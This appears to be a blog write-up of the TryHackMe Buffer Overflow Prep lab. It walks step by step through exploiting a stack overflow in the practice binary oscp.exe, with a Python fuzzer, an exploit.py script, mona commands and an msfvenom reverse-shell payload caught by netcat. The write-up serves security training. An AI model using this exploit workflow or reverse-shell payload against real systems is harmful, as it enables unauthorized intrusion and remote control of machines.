---
title: TryHackMe BufferOverflow

description: Buffer Overflow Prep
categories:
 - tryhackme
 
tags: tryhackme Bufferoverlow
---

## Summary

Practice stack based buffer overflows!


## Starting Immunity Debugger
![](https://github.com/greenway71/greenway71.github.io/blob/340df137c36ee7d428465ec76f36121a57837ae7/Bufferoverflow-screenshot/Screenshot_2021-08-13_04_01_12.png)
Right-click the Immunity Debugger icon on the Desktop and choose "Run as administrator".


![](https://github.com/greenway71/greenway71.github.io/blob/340df137c36ee7d428465ec76f36121a57837ae7/Bufferoverflow-screenshot/Screenshot_2021-08-13_04_02_29.png)

When Immunity loads, click the open file icon, or choose File -> Open. Navigate to the vulnerable-apps folder on the admin user's desktop, and then the "oscp" folder. Select the "oscp" (oscp.exe) binary and click "Open".

## Mona Configuration

Run these command in the input box at the bottom of the immunity Debugger window.

```
!mona config -set workingfolder c:\mona\%p

```
![](https://github.com/greenway71/greenway71.github.io/blob/340df137c36ee7d428465ec76f36121a57837ae7/Bufferoverflow-screenshot/Screenshot_2021-08-13_04_03_54.png)


## Fuzzing

Run this python script to fuzz
```
#!/usr/bin/env python3

import socket, time, sys

ip = "MACHINE_IP"

port = 1337
timeout = 5
prefix = "OVERFLOW1 "

string = prefix + "A" * 100

while True:
  try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
      s.settimeout(timeout)
      s.connect((ip, port))
      s.recv(1024)
      print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
      s.send(bytes(string, "latin-1"))
      s.recv(1024)
  except:
    print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
    sys.exit(0)
  string += 100 * "A"
  time.sleep(1)

```

![](https://github.com/greenway71/greenway71.github.io/blob/340df137c36ee7d428465ec76f36121a57837ae7/Bufferoverflow-screenshot/Screenshot_2021-08-13_04_04_52.png)

Basically, this script is going to send increasingly long strings comprised of As. If the server gets crashed, the fuzzer should exit with an error message.
![](https://github.com/greenway71/greenway71.github.io/blob/340df137c36ee7d428465ec76f36121a57837ae7/Bufferoverflow-screenshot/Screenshot_2021-08-13_04_05_45.png)

![](https://github.com/greenway71/greenway71.github.io/blob/340df137c36ee7d428465ec76f36121a57837ae7/Bufferoverflow-screenshot/Screenshot_2021-08-13_04_06_06.png)

## Crash Replication & Controlling EIP
```
import socket

ip = "MACHINE_IP"
port = 1337

prefix = "OVERFLOW1 "
offset = 0
overflow = "A" * offset
retn = ""
padding = ""
payload = ""
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
```


Run the following command to generate a cyclic pattern of a length 2400 bytes longer that the string that crashed the server (change the -l value to this):
```
msf-pattern_create -l 2400
```
![](https://github.com/greenway71/greenway71.github.io/blob/340df137c36ee7d428465ec76f36121a57837ae7/Bufferoverflow-screenshot/Screenshot_2021-08-13_04_06_23.png)

Copy the output and place it into the payload variable of the exploit.py script.

On Windows, in Immunity Debugger, re-open the oscp.exe again using the same method as before, and click the red play icon to get it running. You will have to do this prior to each time we run the exploit.py (which we will run multiple times with incremental modifications).

Now, run the modified exploit.py script.

![](https://github.com/greenway71/greenway71.github.io/blob/340df137c36ee7d428465ec76f36121a57837ae7/Bufferoverflow-screenshot/Screenshot_2021-08-13_04_08_39.png)

After running the script, the oscp.exe is gonna crash.
![](https://github.com/greenway71/greenway71.github.io/blob/340df137c36ee7d428465ec76f36121a57837ae7/Bufferoverflow-screenshot/Screenshot_2021-08-13_04_10_44.png)
Since, the immunity debugger will get paused.Play it again.

Run the following mona command, changing the distance to the same length as the pattern you created:
```
!mona findmsp -distance 2400
```
![](https://github.com/greenway71/greenway71.github.io/blob/340df137c36ee7d428465ec76f36121a57837ae7/Bufferoverflow-screenshot/Screenshot_2021-08-13_04_11_21.png)

Mona should display a log window with the output of the command. If not, click the "Window" menu and then "Log data" to view it (choose "CPU" to switch back to the standard view).

In this output you should see a line which states:

```
EIP contains normal pattern : ... (offset XXXX)
```
Here, I got the offset is 1978.
Adding this offset to exploit.py

![](https://github.com/greenway71/greenway71.github.io/blob/340df137c36ee7d428465ec76f36121a57837ae7/Bufferoverflow-screenshot/Screenshot_2021-08-13_04_12_27.png)

Update your exploit.py script and set the offset variable to this value (was previously set to 0). Set the payload variable to an empty string again. Set the retn variable to "BBBB".

Restart oscp.exe in Immunity and run the modified exploit.py script again. The EIP register should now be overwritten with the 4 B's (e.g. 42424242).

![](https://github.com/greenway71/greenway71.github.io/blob/340df137c36ee7d428465ec76f36121a57837ae7/Bufferoverflow-screenshot/Screenshot_2021-08-13_04_13_57.png)



## Finding Bad Characters
Generate a bytearray using mona, and exclude the null byte (\x00) by default. Note the location of the bytearray.bin file that is generated (if the working folder was set per the Mona Configuration section of this guide, then the location should be C:\mona\oscp\bytearray.bin).

```
!mona bytearray -b "\x00"
```

Now generate a string of bad chars that is identical to the bytearray. The following python script can be used to generate a string of bad chars from \x01 to \xff:
```
for x in range(1, 256):
  print("\\x" + "{:02x}".format(x), end='')
print()
```

Update your exploit.py script and set the payload variable to the string of bad chars the script generates.

![](https://github.com/greenway71/greenway71.github.io/blob/340df137c36ee7d428465ec76f36121a57837ae7/Bufferoverflow-screenshot/Screenshot_2021-08-13_04_14_29.png)

Replace the generated payload in the exploit.py

![](https://github.com/greenway71/greenway71.github.io/blob/340df137c36ee7d428465ec76f36121a57837ae7/Bufferoverflow-screenshot/Screenshot_2021-08-13_04_15_22.png)

Restart oscp.exe in Immunity and run the modified exploit.py script again. Make a note of the address to which the ESP register points and use it in the following mona command:

```
!mona compare -f C:\mona\oscp\bytearray.bin -a <address>
```

![](https://github.com/greenway71/greenway71.github.io/blob/340df137c36ee7d428465ec76f36121a57837ae7/Bufferoverflow-screenshot/Screenshot_2021-08-13_04_17_12.png)

![](https://github.com/greenway71/greenway71.github.io/blob/340df137c36ee7d428465ec76f36121a57837ae7/Bufferoverflow-screenshot/Screenshot_2021-08-13_04_18_50.png)

Notice the change in ESP. Here, I got 0182FA30

A popup window should appear labelled "mona Memory comparison results". If not, use the Window menu to switch to it. The window shows the results of the comparison, indicating any characters that are different in memory to what they are in the generated bytearray.bin file.

Not all of these might be badchars! Sometimes badchars cause the next byte to get corrupted as well, or even effect the rest of the string.

The first badchar in the list should be the null byte (\x00) since we already removed it from the file. Make a note of any others. Generate a new bytearray in mona, specifying these new badchars along with \x00. Then update the payload variable in your exploit.py script and remove the new badchars as well.


![](https://github.com/greenway71/greenway71.github.io/blob/340df137c36ee7d428465ec76f36121a57837ae7/Bufferoverflow-screenshot/Screenshot_2021-08-13_04_18_58.png)

![](https://github.com/greenway71/greenway71.github.io/blob/340df137c36ee7d428465ec76f36121a57837ae7/Bufferoverflow-screenshot/Screenshot_2021-08-13_04_20_22.png)

Restart oscp.exe in Immunity and run the modified exploit.py script again. Repeat the badchar comparison until the results status returns "Unmodified". This indicates that no more badchars exist.

![](https://github.com/greenway71/greenway71.github.io/blob/340df137c36ee7d428465ec76f36121a57837ae7/Bufferoverflow-screenshot/Screenshot_2021-08-13_04_22_23.png)

![](https://github.com/greenway71/greenway71.github.io/blob/340df137c36ee7d428465ec76f36121a57837ae7/Bufferoverflow-screenshot/Screenshot_2021-08-13_04_23_37.png)
Here, the result status returns "unmodified".


## Finding Jump Point

With the oscp.exe either running or in a crashed state, run the following mona command, making sure to update the -cpb option with all the badchars you identified (including \x00):

```
!mona jmp -r esp -cpb "\x00"
```

This command finds all "jmp esp" (or equivalent) instructions with addresses that don't contain any of the badchars specified. The results should display in the "Log data" window (use the Window menu to switch to it if needed).


![](https://github.com/greenway71/greenway71.github.io/blob/340df137c36ee7d428465ec76f36121a57837ae7/Bufferoverflow-screenshot/Screenshot_2021-08-13_04_25_18.png)

Choose an address and update your exploit.py script, setting the "retn" variable to the address, written backwards (since the system is little endian). For example if the address is \x01\x02\x03\x04 in Immunity, write it as \x04\x03\x02\x01 in your exploit.

Here, I got 0x625011af but we need to write like this: "\xaf\x11\x50\x62"

![](https://github.com/greenway71/greenway71.github.io/blob/340df137c36ee7d428465ec76f36121a57837ae7/Bufferoverflow-screenshot/Screenshot_2021-08-13_04_26_45.png)
Also edit the retn variable in exploit.py.

## Generate Payload

Run the following msfvenom command on Kali, using your Kali VPN IP as the LHOST and updating the -b option with all the badchars you identified (including \x00):

```
msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 EXITFUNC=thread -b "\x00" -f c
```
The above syntax would look like this:


![](https://github.com/greenway71/greenway71.github.io/blob/340df137c36ee7d428465ec76f36121a57837ae7/Bufferoverflow-screenshot/Screenshot_2021-08-13_04_27_45.png)


Copy the generated C code strings and integrate them into your exploit.py script payload variable.

## Prepend NOPs

Since an encoder was likely used to generate the payload, you will need some space in memory for the payload to unpack itself. You can do this by setting the padding variable to a string of 16 or more "No Operation" (\x90) bytes:

padding = "\x90" * 16

![](https://github.com/greenway71/greenway71.github.io/blob/340df137c36ee7d428465ec76f36121a57837ae7/Bufferoverflow-screenshot/Screenshot_2021-08-13_04_29_20.png)


## Exploit

With the correct prefix, offset, return address, padding, and payload set, you can now exploit the buffer overflow to get a reverse shell.

Start a netcat listener on your Kali box using the LPORT you specified in the msfvenom command (4444 if you didn't change it).

Restart oscp.exe in Immunity and run the modified exploit.py script again. Your netcat listener should catch a reverse shell!


![](https://github.com/greenway71/greenway71.github.io/blob/340df137c36ee7d428465ec76f36121a57837ae7/Bufferoverflow-screenshot/Screenshot_2021-08-13_04_30_19.png)


![](https://github.com/greenway71/greenway71.github.io/blob/340df137c36ee7d428465ec76f36121a57837ae7/Bufferoverflow-screenshot/Screenshot_2021-08-13_04_30_55.png)

![](https://github.com/greenway71/greenway71.github.io/blob/340df137c36ee7d428465ec76f36121a57837ae7/Bufferoverflow-screenshot/Screenshot_2021-08-13_04_34_05.png)

![](https://github.com/greenway71/greenway71.github.io/blob/340df137c36ee7d428465ec76f36121a57837ae7/Bufferoverflow-screenshot/Screenshot_2021-08-13_04_34_55.png)












